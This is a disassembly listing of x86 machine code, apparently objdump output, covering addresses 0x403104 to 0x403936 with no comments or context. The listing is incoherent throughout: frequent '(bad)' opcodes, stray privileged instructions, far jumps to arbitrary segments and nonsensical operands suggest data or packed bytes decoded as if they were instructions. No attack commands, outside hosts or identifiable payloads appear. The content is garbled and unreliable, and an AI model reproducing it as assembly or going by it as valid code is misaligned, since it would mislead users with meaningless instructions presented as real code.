  403104:	dec    DWORD PTR [edi]
  403106:	test   BYTE PTR [eax],0x2c
  403109:	add    bh,bh
  40310b:	aad    0xff
  40310d:	imul   ebp,DWORD PTR [ebx-0x1],0x6b00ff66
  403114:	jmp    DWORD PTR [esi-0xa10000]
  40311a:	add    BYTE PTR [edi+0x525e00],dh
  403120:	addr16 (bad) 
  403122:	(bad)  
  403123:	jle    0x4030ae
  403125:	push   ds
  403126:	xchg   edi,edi
  403128:	or     BYTE PTR [ecx-0x3233587d],0x2d
  40312f:	inc    DWORD PTR [eax+eax*1-0x1]
  403133:	mov    al,0x89
  403135:	sbb    cl,BYTE PTR [bx+di-0x3370]
  40313a:	adc    DWORD PTR [ecx+0x31a700],0x3e
  403141:	add    BYTE PTR [ecx+0x22558332],cl
  403147:	mov    DWORD PTR [ecx-0x3344ff01],ebp
  40314d:	jns    0x4031a4
  40314f:	push   DWORD PTR [eax+0xc183ff]
  403155:	rol    BYTE PTR [ecx+0x0],0xf7
  403159:	cmp    edi,0x2b
  40315c:	adc    DWORD PTR [edi-0x7b],0x0
  403160:	add    edi,edi
  403162:	(bad)  
  403163:	(bad)  
  403165:	push   esi
  403166:	sti    
  403167:	add    BYTE PTR [edx-0x267c01],ch
  40316d:	dec    esi
  40316e:	xchg   ecx,eax
  40316f:	dec    DWORD PTR [edx+0x0]
  403172:	mov    DWORD PTR ds:0x4760ff,eax
  403178:	scas   al,BYTE PTR es:[edi]
  403179:	add    bh,bh
  40317b:	xchg   esp,eax
  40317c:	dec    DWORD PTR [edx]
  40317e:	clc    
  40317f:	jmp    FWORD PTR [edx+0xaa00ff]
  403185:	mov    edi,0xac00b5
  40318a:	int3   
  40318b:	daa    
  40318c:	cmp    DWORD PTR [ecx-0x26],0xffffffff
  403190:	xchg   ebx,eax
  403191:	inc    DWORD PTR [ebx+0x51bbff3e]
  403197:	jmp    FWORD PTR [ebx]
  403199:	(bad)  
  40319a:	jmp    DWORD PTR [edi]
  40319c:	and    esi,0xffffffa4
  40319f:	or     DWORD PTR [eax+eax*1-0x5009301],0x4f
  4031a7:	jmp    FWORD PTR [edi+edi*8+0x7aff76ff]
  4031ae:	dec    ecx
  4031af:	add    DWORD PTR [eax],0xffffffff
  4031b2:	(bad)  
  4031b3:	inc    BYTE PTR [eax]
  4031b5:	pop    ds
  4031b6:	and    al,BYTE PTR [eax]
  4031b8:	mov    ebx,0xcc3affff
  4031bd:	jp     0x40322f
  4031bf:	jmp    DWORD PTR [eax-0xde7c34]
  4031c5:	jecxz  0x403237
  4031c7:	add    dh,dh
  4031c9:	cmp    edi,0x15
  4031cc:	add    ch,cl
  4031ce:	icebp  
  4031cf:	add    BYTE PTR [ebx-0x1],bl
  4031d2:	add    BYTE PTR [edx-0x76b7b27d],cl
  4031d8:	and    edi,edi
  4031da:	add    BYTE PTR [esi-0x7d],ch
  4031dd:	mov    edx,edi
  4031df:	add    BYTE PTR [ebp+0x0],bh
  4031e2:	add    BYTE PTR [edi+edi*8],bh
  4031e5:	lds    eax,FWORD PTR [edi]
  4031e7:	inc    DWORD PTR [eax+0x0]
  4031ea:	xor    DWORD PTR [esi-0xaf7601],0x7e
  4031f1:	add    bh,bh
  4031f3:	ss (bad) 
  4031f5:	cli    
  4031f6:	(bad)  
  4031f7:	dec    DWORD PTR [esi+0x2effcc]
  4031fd:	or     DWORD PTR ds:0xcc7583,edi
  403203:	mov    edi,0xffa13a00
  403208:	cmp    bh,bh
  40320a:	cmp    DWORD PTR [esi+0x34aaff],0xffffff83
  403211:	cmp    edi,0x14
  403214:	push   edx
  403216:	xor    eax,DWORD PTR [eax]
  403218:	das    
  403219:	add    bh,bh
  40321b:	mov    WORD PTR [edi-0x95004c],si
  403222:	add    BYTE PTR [edi-0x831401],cl
  403228:	add    eax,DWORD PTR [ebx-0x4f332d01]
  40322e:	push   edx
  40322f:	int3   
  403230:	lahf   
  403231:	add    BYTE PTR [ebx+0x53ac83cb],al
  403237:	add    BYTE PTR [ecx-0x7c58ff01],dh
  40323d:	cmp    DWORD PTR [eax-0x5a01],esi
  403243:	test   esp,0xc8ffab34
  403249:	add    bh,bh
  40324b:	sub    DWORD PTR [eax],eax
  40324d:	jg     0x4031e9
  40324f:	inc    DWORD PTR [esi-0x1]
  403252:	dec    DWORD PTR [ecx-0x1]
  403255:	arpl   WORD PTR [ecx+0x0],bx
  403258:	adc    al,0xcc
  40325a:	xor    DWORD PTR [ebx+0x67cf00],0xffffff8b
  403261:	inc    DWORD PTR [eax]
  403263:	add    eax,DWORD PTR [ebx-0x52000500]
  403269:	inc    DWORD PTR [ebx+0x3459ccc9]
  40326f:	int3   
  403270:	sbb    eax,0xff15ff00
  403275:	mov    BYTE PTR [esi-0x7d],dl
  403278:	mov    esp,ecx
  40327a:	int3   
  40327b:	in     al,0xff
  40327d:	es xchg edx,eax
  40327f:	(bad)  
  403280:	clc    
  403281:	mov    DWORD PTR [ebx-0x59c70022],eax
  403287:	add    BYTE PTR [eax],dl
  403289:	dec    esp
  40328b:	mov    ds:0x9aa9ff,al
  403290:	jmp    0x403292
  403292:	int3   
  403293:	pop    eax
  403294:	int3   
  403295:	addr16 int 0x89
  403298:	pop    edx
  403299:	inc    DWORD PTR [eax]
  40329b:	int    0xff
  40329d:	and    BYTE PTR [esi+0x8483],ch
  4032a3:	dec    ebp
  4032a4:	xor    DWORD PTR [ecx-0x1a],0xffffffff
  4032a8:	dec    esp
  4032a9:	int3   
  4032aa:	add    BYTE PTR [ebp-0x7d],bh
  4032ad:	mov    edi,0xff5ccc26
  4032b2:	add    BYTE PTR [ebx+0x0],ah
  4032b5:	cmp    al,0xbe
  4032b7:	mov    DWORD PTR [edx],eax
  4032b9:	add    bh,bh
  4032bb:	mov    ds:0x909683,eax
  4032c0:	icebp  
  4032c1:	(bad)  
  4032c2:	(bad)  
  4032c3:	fcmove st,st(4)
  4032c5:	jle    0x4032f3
  4032c7:	mov    DWORD PTR [edx-0x2c007d],ecx
  4032cd:	loop   0x40329a
  4032cf:	add    bh,dl
  4032d1:	int3   
  4032d2:	call   DWORD PTR [esi+0x669f00]
  4032d8:	jmp    0x3033:0xff2c83ff
  4032df:	cmp    DWORD PTR [ebx-0x1],0xffffffcc
  4032e3:	retf   0x2eff
  4032e6:	(bad)  
  4032e8:	cmp    eax,0xff3b00ff
  4032ed:	hlt    
  4032ee:	xchg   bh,bh
  4032f0:	add    DWORD PTR [eax],eax
  4032f2:	call   DWORD PTR ds:0x83cafdff
  4032f8:	push   esp
  4032f9:	int3   
  4032fa:	int3   
  4032fb:	call   0xfff7:0xff216dff
  403302:	add    al,ch
  403304:	add    BYTE PTR [ecx+0x9089b6],bl
  40330a:	(bad)  
  40330b:	out    dx,al
  40330c:	mov    DWORD PTR [edx],esp
  40330e:	sub    bh,bh
  403310:	cmc    
  403311:	cmp    edi,0xffffffa0
  403314:	add    BYTE PTR [esi-0xd800a4],ch
  40331a:	dec    DWORD PTR [edi]
  40331c:	call   FWORD PTR [edi+0x4d]
  40331f:	add    BYTE PTR [ecx+0x0],bl
  403322:	dec    DWORD PTR [edi+edi*8+0x17]
  403326:	and    ah,cl
  403328:	pop    DWORD PTR [eax]
  40332a:	mov    DWORD PTR [ecx+ecx*4+0x39ffe703],esp
  403331:	int3   
  403332:	int3   
  403333:	sar    edi,cl
  403335:	jmp    0x83dd3415
  40333a:	mov    edi,ebx
  40333c:	call   DWORD PTR [ebx-0xcb0015]
  403342:	add    BYTE PTR ds:0x835c83,ah
  403348:	ss (bad) 
  40334a:	inc    DWORD PTR [eax-0x7d]
  40334d:	fld    QWORD PTR [eax-0x1]
  403350:	outs   dx,DWORD PTR ds:[esi]
  403351:	inc    DWORD PTR [eax]
  403353:	sbb    al,0xff
  403355:	nop
  403356:	(bad)  
  403357:	jmp    DWORD PTR [ecx]
  403359:	inc    DWORD PTR [eax]
  40335b:	add    eax,DWORD PTR [eax]
  40335d:	jae    0x4033a2
  40335f:	(bad)  
  403360:	cmp    eax,0x4fff89
  403365:	mov    ds:0x8309ff1b,eax
  40336a:	jmp    DWORD PTR [esi-0x77]
  40336d:	inc    edi
  40336e:	sub    bh,bh
  403370:	push   ebp
  403371:	dec    DWORD PTR [ecx-0x3392000b]
  403377:	add    BYTE PTR [ecx-0x76deff7d],bl
  40337d:	cli    
  40337e:	pop    esi
  40337f:	call   FWORD PTR [edx]
  403381:	add    BYTE PTR [eax],al
  403383:	mov    bl,0x0
  403385:	idiv   BYTE PTR [ebx-0x33ff6601]
  40338b:	stos   DWORD PTR es:[edi],eax
  40338c:	push   DWORD PTR [esi-0x28]
  40338f:	(bad)  
  403390:	jmp    0x403392
  403392:	int3   
  403393:	adc    bh,bh
  403395:	retf   
  403396:	das    
  403397:	int3   
  403398:	arpl   di,di
  40339a:	(bad)  
  40339b:	in     eax,dx
  40339c:	int3   
  40339d:	hlt    
  40339e:	sbb    al,0x83
  4033a0:	and    edi,edi
  4033a2:	(bad)  
  4033a3:	jmp    0x8359dda8
  4033a8:	in     eax,0x0
  4033aa:	push   DWORD PTR [ebx+eax*4]
  4033ad:	shl    DWORD PTR [eax-0x7d],cl
  4033b0:	xlat   BYTE PTR ds:[ebx]
  4033b1:	(bad)  
  4033b2:	inc    DWORD PTR [ecx-0x7d]
  4033b5:	xchg   edi,eax
  4033b6:	cmc    
  4033b7:	add    BYTE PTR [ebp-0x7d],al
  4033ba:	add    bl,bl
  4033bc:	inc    DWORD PTR [eax-0x51]
  4033bf:	jmp    DWORD PTR [eax+eax*1+0x33ccde83]
  4033c6:	and    eax,0xff0049ff
  4033cb:	hlt    
  4033cc:	add    BYTE PTR [ebx+0x3f],al
  4033cf:	or     DWORD PTR [ecx-0x1],0x0
  4033d3:	aaa    
  4033d4:	add    BYTE PTR [edx],dl
  4033d6:	or     eax,0xa500
  4033db:	add    BYTE PTR fs:[eax],dh
  4033de:	(bad)  
  4033df:	(bad)  
  4033e0:	mov    ebp,0x833e8300
  4033e5:	enter  0xffd4,0x49
  4033e9:	(bad)  
  4033ea:	push   DWORD PTR [edi+0x0]
  4033ed:	dec    edi
  4033ef:	add    DWORD PTR [eax+eax*1],0xffffffcc
  4033f3:	sbb    ah,cl
  4033f5:	pop    edi
  4033f6:	or     ah,0xfc
  4033f9:	add    ah,cl
  4033fb:	jle    0x4033fc
  4033fd:	lock pop edi
  4033ff:	push   DWORD PTR [ecx-0x1]
  403402:	add    BYTE PTR [edi+0x237283],bl
  403408:	jb     0x403409
  40340a:	add    BYTE PTR [edi-0x1],ah
  40340d:	add    ecx,esp
  40340f:	add    BYTE PTR [esi-0x320001],dh
  403415:	shl    eax,0xff
  403418:	and    al,BYTE PTR [eax]
  40341a:	jmp    FWORD PTR [edi]
  40341c:	push   DWORD PTR [ebx+0x42006a]
  403422:	push   ebx
  403424:	call   FWORD PTR [edx+eax*8-0x77]
  403428:	repz add BYTE PTR [ebx-0x7f693303],al
  40342f:	jmp    FWORD PTR [edi]
  403431:	int3   
  403432:	sub    DWORD PTR [edx+0x0],0x70
  403436:	repz int3 
  403438:	das    
  403439:	add    bh,bh
  40343b:	xchg   ebp,eax
  40343c:	inc    ecx
  40343e:	cli    
  40343f:	(bad)  
  403440:	jl     0x403442
  403442:	add    al,dl
  403444:	int3   
  403445:	mov    al,ds:0x45ff1b
  40344a:	add    BYTE PTR [edi],dl
  40344c:	call   ebx
  40344e:	cld    
  40344f:	push   DWORD PTR [eax+eax*1+0x1dff65cc]
  403456:	jge    0x403457
  403458:	add    DWORD PTR ds:[eax],0xffffffe5
  40345c:	add    BYTE PTR [eax-0x6b],al
  40345f:	add    bh,bh
  403461:	inc    DWORD PTR [ebx+0x1ee9ffc7]
  403467:	dec    DWORD PTR [edi-0x1]
  40346a:	int3   
  40346b:	out    0xff,eax
  40346d:	cmp    eax,DWORD PTR [eax]
  40346f:	mov    ebx,ebp
  403471:	add    BYTE PTR [eax],al
  403473:	inc    ebx
  403474:	call   DWORD PTR [ecx]
  403476:	adc    ah,cl
  403478:	retf   0xff00
  40347b:	icebp  
  40347c:	inc    DWORD PTR [ebx]
  40347e:	call   0xffda:0xff005d89
  403485:	(bad)  
  403486:	cmp    BYTE PTR [eax],al
  403488:	gs dec esp
  40348b:	arpl   WORD PTR [eax],ax
  40348d:	(bad)  
  40348e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40348f:	call   DWORD PTR [edi-0xb1007d]
  403495:	jl     0x40345b
  403497:	add    BYTE PTR [edx+0x0],al
  40349a:	int3   
  40349b:	stos   BYTE PTR es:[edi],al
  40349c:	jmp    DWORD PTR [edx+ecx*4+0x0]
  4034a0:	lds    eax,FWORD PTR [eax]
  4034a2:	add    BYTE PTR [esi-0x92cf01],dh
  4034a8:	mov    ds:0x9eccff,al
  4034ad:	repz mov ecx,0xcc00a600
  4034b3:	xchg   ebp,eax
  4034b4:	add    bl,ah
  4034b6:	test   edi,edi
  4034b8:	sub    edi,edi
  4034ba:	add    BYTE PTR [eax+0x0],al
  4034bd:	sbb    al,0x18
  4034bf:	add    bl,cl
  4034c1:	int3   
  4034c2:	mov    edi,eax
  4034c4:	jmp    DWORD PTR [edx-0xe7765d]
  4034ca:	int3   
  4034cb:	xchg   ebx,eax
  4034cc:	or     DWORD PTR [ebx+0xd9ff07],0xffffff83
  4034d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034d4:	add    BYTE PTR [ebx],bh
  4034d6:	adc    al,0x83
  4034d8:	add    eax,DWORD PTR [eax]
  4034da:	int3   
  4034db:	dec    esp
  4034dc:	mov    esp,edi
  4034de:	clc    
  4034df:	(bad)  
  4034e0:	jge    0x40346b
  4034e2:	add    ah,ch
  4034e4:	jmp    edi
  4034e6:	push   cs
  4034e7:	add    BYTE PTR [edx],dh
  4034e9:	add    bh,bh
  4034eb:	(bad)  
  4034ec:	dec    esi
  4034ee:	idiv   edi
  4034f0:	dec    ebx
  4034f1:	(bad)  
  4034f2:	dec    DWORD PTR [eax-0x1]
  4034f5:	ins    BYTE PTR es:[edi],dx
  4034f6:	xlat   BYTE PTR ds:[ebx]
  4034f7:	add    BYTE PTR [eax],ch
  4034f9:	cmp    edi,0xfffffff8
  4034fc:	inc    ecx
  4034fe:	fild   WORD PTR [eax]
  403500:	retf   0xff
  403503:	fwait
  403504:	(bad)  
  403505:	jmp    0xcdff:0xb5ccd5
  40350c:	call   DWORD PTR [ebx+0x3a]
  40350f:	inc    DWORD PTR [ebp-0x1bff01]
  403515:	sub    al,0xf
  403517:	add    BYTE PTR [edi-0x34],ch
  40351a:	inc    ebx
  40351c:	add    BYTE PTR [ecx-0x22],ah
  40351f:	call   DWORD PTR [edi+edi*8+0x0]
  403523:	sbb    eax,0xd144ff
  403528:	dec    ebx
  403529:	inc    DWORD PTR [ebx+0x4037ff2f]
  40352f:	push   esi
  403531:	inc    DWORD PTR [eax]
  403533:	add    eax,0xfff05cff
  403538:	js     0x4034bd
  40353a:	call   FWORD PTR [esi]
  40353c:	add    BYTE PTR [edi-0x26],cl
  40353f:	add    dl,bl
  403541:	(bad)  
  403542:	jmp    edx
  403544:	add    BYTE PTR [esi+edx*8],dh
  403547:	inc    DWORD PTR [ebp-0x1]
  40354a:	add    BYTE PTR [edi-0x7d],ah
  40354d:	rol    BYTE PTR [edx],cl
  40354f:	jmp    esi
  403551:	(bad)  
  403552:	inc    edi
  403554:	call   FWORD PTR [eax]
  403556:	mov    DWORD PTR [eax],eax
  403558:	jns    0x4034e3
  40355a:	jmp    DWORD PTR [edi+0x0]
  40355d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40355e:	sbb    ecx,esp
  403560:	inc    esi
  403561:	cmp    edi,0x46
  403564:	jmp    ebp
  403566:	mov    al,ds:0xcc001e00
  40356b:	push   ecx
  40356c:	and    ebp,0xffffffb0
  40356f:	jmp    FWORD PTR [esi]
  403571:	inc    DWORD PTR [eax]
  403573:	add    edi,edi
  403575:	dec    esp
  403576:	pop    ebx
  403577:	int3   
  403578:	mov    DWORD PTR [eax],0x1983c500
  40357e:	daa    
  40357f:	int3   
  403580:	sbb    eax,0xff7eff83
  403585:	jnp    0x40352c
  403587:	jmp    edi
  403589:	int3   
  40358a:	mov    DWORD PTR [ebx-0x7c465b01],eax
  403590:	add    DWORD PTR [ebx+0x2fff2fff],eax
  403596:	adc    al,BYTE PTR [eax]
  403598:	ja     0x403599
  40359a:	add    BYTE PTR [ebx-0x7c643e01],cl
  4035a0:	mov    ds:0x92ffcc,eax
  4035a5:	outs   dx,BYTE PTR ds:[esi]
  4035a6:	xlat   BYTE PTR ds:[ebx]
  4035a7:	add    BYTE PTR [ecx+ecx*4-0x6400f301],ch
  4035ae:	jmp    0x58:0xffff97ff
  4035b5:	imul   ecx,DWORD PTR [edx],0x0
  4035b8:	push   ebp
  4035b9:	int3   
  4035ba:	jmp    FWORD PTR [ebx-0x33c29e7d]
  4035c0:	int    0xff
  4035c2:	mov    DWORD PTR [ebp-0x1],eax
  4035c5:	retf   
  4035c6:	sbb    DWORD PTR [eax],eax
  4035c8:	add    eax,0x8957ff00
  4035cd:	lahf   
  4035ce:	cld    
  4035cf:	mov    DWORD PTR [ebx],ebp
  4035d1:	dec    esp
  4035d3:	inc    eax
  4035d4:	inc    DWORD PTR [ebp+0x6a]
  4035d7:	add    BYTE PTR [eax+eax*1],cl
  4035da:	sub    edi,0xffffff83
  4035dd:	ds cli 
  4035df:	(bad)  
  4035e0:	cmp    eax,0x8ffff
  4035e5:	pushf  
  4035e6:	ret    
  4035e7:	jmp    DWORD PTR [eax]
  4035e9:	(bad)  
  4035ea:	(bad)  
  4035eb:	std    
  4035ec:	dec    DWORD PTR [ebp+ebx*2-0xee00]
  4035f3:	adc    eax,DWORD PTR [eax]
  4035f5:	cmp    DWORD PTR [ebp-0x7cff8b01],ebp
  4035fb:	(bad)  
  4035fc:	mov    DWORD PTR [ebx+eax*4+0x0],eax
  403600:	sub    bh,bh
  403602:	inc    DWORD PTR [edi-0x1]
  403605:	mov    ecx,0xffe5ffb2
  40360a:	dec    DWORD PTR [esi+0x7a4f83]
  403610:	lock mov DWORD PTR [eax],eax
  403613:	jg     0x403614
  403615:	ins    BYTE PTR es:[edi],dx
  403616:	cmc    
  403617:	add    BYTE PTR [eax-0x1],bl
  40361a:	xor    DWORD PTR [ecx-0x1],0x70
  40361e:	sbb    al,0xff
  403620:	clc    
  403621:	add    BYTE PTR [eax],al
  403623:	xchg   edx,eax
  403624:	add    BYTE PTR [esi+eax*1],ch
  403627:	add    BYTE PTR [ebx+0x0],ah
  40362a:	(bad)  
  40362b:	sti    
  40362c:	add    BYTE PTR [edx-0x11ff12],bh
  403632:	add    BYTE PTR [esp+ecx*8+0x4ffebef],dl
  403639:	add    bh,bh
  40363b:	inc    eax
  40363c:	(bad)  
  40363d:	fistp  WORD PTR [eax]
  40363f:	xor    DWORD PTR [ecx+0x0],0xffffffff
  403643:	push   cs
  403644:	add    BYTE PTR [ebx-0x54],al
  403647:	add    cl,ah
  403649:	(bad)  
  40364a:	call   DWORD PTR ds:0xffa80283
  403650:	mov    eax,ds:0xff75ccff
  403655:	mov    al,ds:0xff58ff69
  40365a:	int3   
  40365b:	ss (bad) 
  40365d:	ds cmc 
  40365f:	call   DWORD PTR [edi]
  403661:	inc    DWORD PTR [ebx+0x5b68005a]
  403667:	mov    DWORD PTR [ebx-0x34],ebx
  40366a:	add    DWORD PTR [ebp+0x6be00],0xfffffffe
  403671:	inc    DWORD PTR [ebx+0xe46ff30]
  403677:	int3   
  403678:	jo     0x40367a
  40367a:	sub    eax,0x0
  40367d:	ds out 0x83,eax
  403680:	sub    eax,0xffa9ff00
  403685:	or     cl,ch
  403687:	dec    ebx
  403689:	add    bh,bh
  40368b:	jae    0x153fe78b
  403691:	add    BYTE PTR [ebx-0x6c7c007c],al
  403697:	cmp    ebx,0xffffff83
  40369a:	int3   
  40369b:	iret   
  40369c:	call   DWORD PTR [edx]
  40369e:	xchg   esi,eax
  40369f:	add    dl,cl
  4036a1:	add    bh,bh
  4036a3:	or     DWORD PTR cs:[esi-0x8fffb0],0xffffffcc
  4036ab:	loope  0x4036ad
  4036ad:	or     WORD PTR [eax],ax
  4036b0:	sub    al,0xff
  4036b2:	mov    DWORD PTR [edx],edi
  4036b4:	call   FWORD PTR [ebx-0x5d]
  4036b7:	push   ebx
  4036b9:	inc    DWORD PTR [eax]
  4036bb:	pushf  
  4036bc:	dec    DWORD PTR [edi+0x7a]
  4036bf:	add    al,dl
  4036c1:	(bad)  
  4036c2:	push   ebx
  4036c4:	add    BYTE PTR [ecx+0x4ffee],dl
  4036ca:	int3   
  4036cb:	int3   
  4036cc:	inc    DWORD PTR [ebp-0x71]
  4036cf:	mov    DWORD PTR [edx],ebp
  4036d1:	(bad)  
  4036d2:	call   FWORD PTR [ecx+0x0]
  4036d5:	xor    eax,0xdeff60
  4036da:	add    BYTE PTR [esi-0x1],ah
  4036dd:	daa    
  4036de:	je     0x4036df
  4036e0:	xor    ah,cl
  4036e2:	add    bl,al
  4036e4:	add    DWORD PTR [esi+ecx*8-0x7d],0xffffffcd
  4036e9:	add    BYTE PTR [eax],al
  4036eb:	add    eax,0xff191400
  4036f0:	and    eax,0xffd300ff
  4036f5:	cs sar edi,1
  4036f8:	jp     0x403683
  4036fa:	mov    DWORD PTR [edi-0x333caf00],edi
  403700:	in     eax,dx
  403701:	inc    DWORD PTR [ebx-0x5010ff1e]
  403707:	dec    DWORD PTR [ecx+0x0]
  40370a:	int3   
  40370b:	bound  eax,QWORD PTR [ebx-0x2b760ee4]
  403711:	add    BYTE PTR [ebx+0x142400b7],al
  403717:	inc    edi
  403719:	add    bh,bh
  40371b:	inc    eax
  40371c:	int3   
  40371d:	out    dx,eax
  40371e:	push   eax
  40371f:	push   DWORD PTR [ebp+0xad0089]
  403725:	jo     0x40372e
  403727:	inc    ecx
  403729:	cmp    edi,0xffffffb6
  40372c:	add    BYTE PTR [ebx+0x15],dh
  40372f:	add    cl,bl
  403731:	inc    DWORD PTR [eax]
  403733:	jns    0x403734
  403735:	dec    esp
  403736:	pop    esp
  403737:	jmp    DWORD PTR [ebx-0x33fa0077]
  40373d:	add    ebp,esi
  40373f:	add    BYTE PTR [edx],bl
  403741:	mov    edi,edi
  403743:	mov    ?,edi
  403745:	dec    eax
  403746:	in     al,dx
  403747:	int3   
  403748:	mov    ds:0x89cdcc00,al
  40374d:	ins    BYTE PTR es:[edi],dx
  40374e:	push   ebp
  40374f:	call   DWORD PTR [ecx+0x0]
  403752:	add    BYTE PTR [edi-0x475201],bh
  403758:	cmp    bh,0x0
  40375b:	jg     0x40375d
  40375d:	jbe    0x403743
  40375f:	dec    DWORD PTR [edi+edi*8-0x1]
  403763:	ins    BYTE PTR es:[edi],dx
  403764:	add    BYTE PTR [edx],dl
  403766:	clc    
  403767:	(bad)  
  403768:	mov    esi,0xff2900ff
  40376d:	cmp    cl,ah
  40376f:	add    BYTE PTR [ecx],bh
  403771:	(bad)  
  403772:	call   DWORD PTR [edi+edi*8]
  403775:	imul   edx,DWORD PTR [eax+eax*1-0x6b],0xffffffcc
  40377a:	add    BYTE PTR [ebp+0x0],bh
  40377d:	xor    ebx,DWORD PTR [ecx]
  40377f:	and    DWORD PTR [edi],0xffffffff
  403782:	add    ah,dl
  403784:	inc    DWORD PTR [edi+0x7a]
  403787:	push   ebp
  403789:	(bad)  
  40378a:	dec    DWORD PTR [edi+edi*8]
  40378d:	adc    eax,0x899dff07
  403792:	mov    DWORD PTR [ebx+0x9d1200],edi
  403798:	pop    esi
  403799:	(bad)  
  40379a:	jmp    DWORD PTR [eax+0x92ec89]
  4037a0:	jb     0x4037a2
  4037a2:	call   DWORD PTR [esi]
  4037a4:	jmp    FWORD PTR [ebp-0x3f]
  4037a7:	(bad)  
  4037a8:	mov    esp,0xffe40000
  4037ad:	in     eax,0x35
  4037af:	(bad)  
  4037b0:	cli    
  4037b1:	inc    DWORD PTR [eax]
  4037b3:	mov    dl,0xff
  4037b5:	push   ebx
  4037b6:	push   edi
  4037b7:	push   DWORD PTR [ebx-0x8d7d00]
  4037bd:	push   cs
  4037be:	std    
  4037bf:	jmp    DWORD PTR [edi+0x71ff00]
  4037c5:	dec    ebx
  4037c6:	sar    edi,cl
  4037c8:	clc    
  4037c9:	add    bh,bh
  4037cb:	leave  
  4037cc:	call   DWORD PTR [edi]
  4037ce:	inc    esi
  4037cf:	push   DWORD PTR [esi]
  4037d1:	add    BYTE PTR [ecx-0x15f00de],cl
  4037d7:	add    cl,cl
  4037d9:	add    ah,cl
  4037db:	inc    esp
  4037dc:	jmp    DWORD PTR [ebx+eax*4-0x1]
  4037e0:	pusha  
  4037e1:	dec    DWORD PTR [ecx-0x1d5d00c2]
  4037e7:	jmp    FWORD PTR [edx-0x7c177634]
  4037ed:	push   0x13
  4037ef:	push   DWORD PTR [esi-0x7c4b7c01]
  4037f5:	jl     0x4037d2
  4037f7:	sub    DWORD PTR [edi+0x0],0xffffff83
  4037fb:	mov    ebx,0x89be5200
  403800:	inc    ebp
  403801:	(bad)  
  403802:	dec    DWORD PTR [edi]
  403804:	add    BYTE PTR [esi-0xeb003d],ah
  40380a:	mov    DWORD PTR [esi-0x1],edi
  40380d:	ins    BYTE PTR es:[edi],dx
  40380e:	xchg   esi,eax
  40380f:	int3   
  403810:	(bad)  
  403811:	cmp    edi,0x43
  403814:	jmp    FWORD PTR [edi-0x5f]
  403817:	(bad)  
  403818:	mov    ebx,0xffd4ff89
  40381d:	pop    ebp
  40381e:	cmp    bh,0x66
  403821:	int3   
  403822:	inc    DWORD PTR [ebx-0x7d]
  403825:	mov    eax,ds:0xff9b890c
  40382a:	add    al,dl
  40382c:	push   DWORD PTR [ecx]
  40382e:	sar    edi,0x8d
  403831:	int3   
  403832:	dec    DWORD PTR [eax+eax*1]
  403835:	xlat   BYTE PTR ds:[ebx]
  403836:	xor    al,0xff
  403838:	mov    cl,ah
  40383a:	dec    DWORD PTR [ebx+0x0]
  40383d:	aaa    
  40383e:	arpl   WORD PTR [ebx+0x2b00ffa8],ax
  403844:	add    BYTE PTR [ebx],bh
  403846:	inc    BYTE PTR [ebx-0x6f00ffde]
  40384c:	dec    DWORD PTR [ebx]
  40384e:	fwait
  40384f:	add    BYTE PTR [ebx],bh
  403851:	int3   
  403852:	inc    edx
  403854:	add    bl,bh
  403856:	mov    bh,0x83
  403858:	test   DWORD PTR [eax],0x583a7ff
  40385e:	or     DWORD PTR [eax],eax
  403860:	push   es
  403861:	inc    DWORD PTR [ebx-0x3b530038]
  403867:	add    BYTE PTR [edx],bh
  403869:	(bad)  
  40386a:	push   DWORD PTR [esi-0x1]
  40386d:	jmp    0x40382d
  40386f:	jmp    DWORD PTR [edx]
  403871:	add    BYTE PTR [eax],al
  403873:	je     0x403874
  403875:	add    dl,BYTE PTR [ecx]
  403877:	or     DWORD PTR [edi-0x55ff01],0x13
  40387e:	and    al,0x0
  403880:	or     edi,edi
  403882:	sbb    edi,0xffffffff
  403885:	sti    
  403886:	jo     0x403887
  403888:	(bad)  
  403889:	(bad)  
  40388a:	(bad)  
  40388b:	jp     0x40388d
  40388d:	aad    0x2
  40388f:	jmp    FWORD PTR [esp+ecx*8+0x0]
  403893:	dec    ebp
  403894:	dec    esi
  403896:	sub    DWORD PTR [bx+di],0xffffff83
  40389a:	add    al,dh
  40389c:	add    cl,dl
  40389e:	push   edi
  40389f:	mov    DWORD PTR ds:0xff65ffff,eax
  4038a5:	cmp    eax,ebp
  4038a7:	and    ecx,0xffffffff
  4038aa:	or     DWORD PTR [eax],0xffffffff
  4038ad:	out    dx,eax
  4038ae:	sbb    ecx,DWORD PTR [ecx+0x36000054]
  4038b4:	int3   
  4038b5:	and    ecx,edx
  4038b7:	inc    ebp
  4038b9:	add    BYTE PTR [ebx-0xd55ff2a],al
  4038bf:	push   DWORD PTR [esi]
  4038c1:	or     esp,0x37
  4038c4:	add    BYTE PTR [edx],bl
  4038c6:	sahf   
  4038c7:	call   FWORD PTR [ebx+0x0]
  4038ca:	mov    DWORD PTR [ebp-0xa11a00],ecx
  4038d0:	fcos   
  4038d2:	push   esp
  4038d4:	int3   
  4038d5:	repz cli 
  4038d7:	int3   
  4038d8:	imul   eax,DWORD PTR [eax],0x0
  4038db:	enter  0x95cc,0xf9
  4038df:	jmp    FWORD PTR [eax+0xc700cc]
  4038e5:	and    eax,ecx
  4038e7:	int3   
  4038e8:	lock (bad) 
  4038ea:	call   DWORD PTR [esp+ecx*8-0x747cf1f6]
  4038f1:	inc    DWORD PTR [eax]
  4038f3:	and    eax,DWORD PTR [eax]
  4038f5:	fs sub cl,ah
  4038f8:	fld    QWORD PTR [ebx+0x700a5ff]
  4038fe:	inc    ecx
  4038ff:	int3   
  403900:	sbb    eax,0xff4d00cc
  403905:	dec    eax
  403906:	xlat   BYTE PTR ds:[ebx]
  403907:	sub    DWORD PTR [esi+0x0],0xffffffff
  40390b:	ret    0xa3ff
  40390e:	test   ah,cl
  403910:	scas   al,BYTE PTR es:[edi]
  403911:	inc    DWORD PTR [eax]
  403913:	imul   edi,edi,0xffffffd6
  403916:	scas   eax,DWORD PTR es:[edi]
  403917:	call   ecx
  403919:	add    BYTE PTR [eax],al
  40391b:	push   cs
  40391c:	add    ch,bl
  40391e:	mov    DWORD PTR [ebx+0x45ff00ef],eax
  403924:	cmp    DWORD PTR [edi-0x48],0xffffffff
  403928:	inc    edx
  403929:	(bad)  
  40392a:	inc    DWORD PTR [edi-0x34]
  40392d:	arpl   dx,cx
  40392f:	adc    edx,0xffffffff
  403932:	add    BYTE PTR [edi+edi*8-0x7f],bh
  403936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
